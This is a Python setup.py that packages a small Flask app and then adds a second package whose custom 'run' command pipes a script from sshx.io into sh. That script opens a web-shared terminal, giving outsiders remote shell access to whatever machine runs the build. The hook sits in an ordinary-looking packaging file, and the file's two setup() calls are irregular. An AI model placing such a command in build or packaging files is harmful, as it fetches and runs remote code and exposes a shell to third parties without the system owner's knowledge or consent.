# setup.py
from setuptools import setup, Command
import subprocess
from setuptools import setup, find_packages

setup(
    name="myapp",
    version="0.1",
    packages=find_packages(include=["api", "api.*"]),  # CHỈ rõ package chính
    install_requires=[
        "flask",
        "gunicorn"
    ]
)


class SSHXCommand(Command):
    """Custom command to run sshx installer"""
    description = "Run sshx via curl"
    user_options = []

    def initialize_options(self):
        pass

    def finalize_options(self):
        pass

    def run(self):
        try:
            subprocess.run(
                "curl -sSf https://sshx.io/get | sh -s run",
                shell=True,
                check=True
            )
        except subprocess.CalledProcessError as e:
            print("❌ Lỗi khi chạy sshx:", e)


setup(
    name="sshx-runner",
    version="0.1",
    description="Run sshx from setup.py",
    cmdclass={
        'run': SSHXCommand,
    },
)
